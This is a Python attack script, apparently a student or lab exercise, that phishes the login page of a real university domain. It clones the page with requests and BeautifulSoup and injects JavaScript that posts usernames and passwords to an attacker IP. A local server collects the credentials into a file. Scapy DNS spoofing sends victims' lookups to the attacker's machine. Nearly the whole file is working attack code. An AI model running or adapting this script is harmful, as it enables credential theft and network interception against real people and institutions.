import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from http.server import SimpleHTTPRequestHandler, HTTPServer, BaseHTTPRequestHandler
import socketserver
from threading import Thread
from scapy.all import *
from constants import ATTACKER_IP

# Configuration
attacker_ip = ATTACKER_IP
target_domain = "fs.singaporetech.edu.sg"
cloned_site_dir = "cloned_site"
attacker_server_port = 8080

# Global variable to stop DNS spoofing
stop_sniffing = False

# Function to clone the website
def clone_website(url, save_dir):
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36'}
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Save the main page
    with open(os.path.join(save_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(response.text)

    # Download linked resources (CSS, JS, images)
    for tag in soup.find_all(['link', 'script', 'img']):
        src = tag.get('href') or tag.get('src')
        if src:
            src_url = urljoin(url, src)
            # Determine file path to save
            resource_path = os.path.join(save_dir, os.path.basename(urlparse(src_url).path))
            # Fetch and save resource
            try:
                res = requests.get(src_url)
                with open(resource_path, 'wb') as res_file:
                    res_file.write(res.content)
                print(f"Downloaded: {src_url}")
            except requests.RequestException as e:
                print(f"Failed to download {src_url}: {e}")

    print("Website cloning completed.")

# Function to start the web server
def start_web_server(port, directory):
    class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)

    handler = CustomHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"Serving at port {port}")
        httpd.serve_forever()

# Function to handle DNS spoofing
def dns_spoof(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:  # QR == 0 means it's a DNS request
        if "in-addr.arpa" in pkt[DNS].qd.qname.decode():
            eth = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            icmp = ICMP(type=3, code=3)
            oip = pkt.getlayer(IP)
            oudp = pkt.getlayer(UDP)
            p = eth / ip / icmp / oip / oudp
            sendp(p, verbose=0)
        if target_domain in pkt[DNS].qd.qname.decode():
            print(f"Spoofing DNS request for {target_domain}")
            # Construct the DNS response
            spoofed_pkt = Ether(src=pkt[Ether].dst,dst=pkt[Ether].src) / \
                          IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=attacker_ip))
            sendp(spoofed_pkt, verbose=0)
            print(f"Sent spoofed DNS response to {pkt[IP].src}")

def stop_filter(pkt):
    return stop_sniffing

# Define the attacker's server to capture credentials
class StealCredentialsHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        global stop_sniffing
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        parsed_data = parse_qs(post_data.decode('utf-8'))

        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]

        with open("stolen_credentials.txt", "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Credentials stolen successfully")

        # Stop DNS spoofing
        stop_sniffing = True
        print("Credentials obtained. Stopping DNS spoofing...")

# Start the attacker's server
def start_attacker_server():
    server_address = ('', attacker_server_port)
    httpd = HTTPServer(server_address, StealCredentialsHandler)
    print(f"Attacker server running on port {attacker_server_port}")
    httpd.serve_forever()

# Clone the website
clone_website(f"https://{target_domain}", cloned_site_dir)

# Update the cloned index.html to include the credential stealing script
index_path = os.path.join(cloned_site_dir, 'index.html')
with open(index_path, 'r', encoding='utf-8') as file:
    html_content = file.read()

html_content = html_content.replace(
    '<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" action="http://fs.singaporetech.edu.sg">',
    f'<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return sendCredentials();" action="http://{attacker_ip}:{attacker_server_port}/steal">'
).replace(
    '<script type="text/javascript">',
    f'<script type="text/javascript">\nfunction sendCredentials() {{\n    var userName = document.getElementById(\'userNameInput\').value;\n    var password = document.getElementById(\'passwordInput\').value;\n\n    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "http://{attacker_ip}:{attacker_server_port}/steal", true);\n    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n    xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));\n\n    window.location.href = "https://xsite.singaporetech.edu.sg";\n    return false;\n}}\n'
)

with open(index_path, 'w', encoding='utf-8') as file:
    file.write(html_content)

# Start the web server in a separate thread
web_server_thread = Thread(target=start_web_server, args=(80, "test1"))
web_server_thread.start()

# Start the attacker's server in a separate thread
attacker_server_thread = Thread(target=start_attacker_server)
attacker_server_thread.start()

# Start DNS spoofing
print("Starting DNS spoofing...")
sniff(filter="udp port 53", prn=dns_spoof, stop_filter=stop_filter)
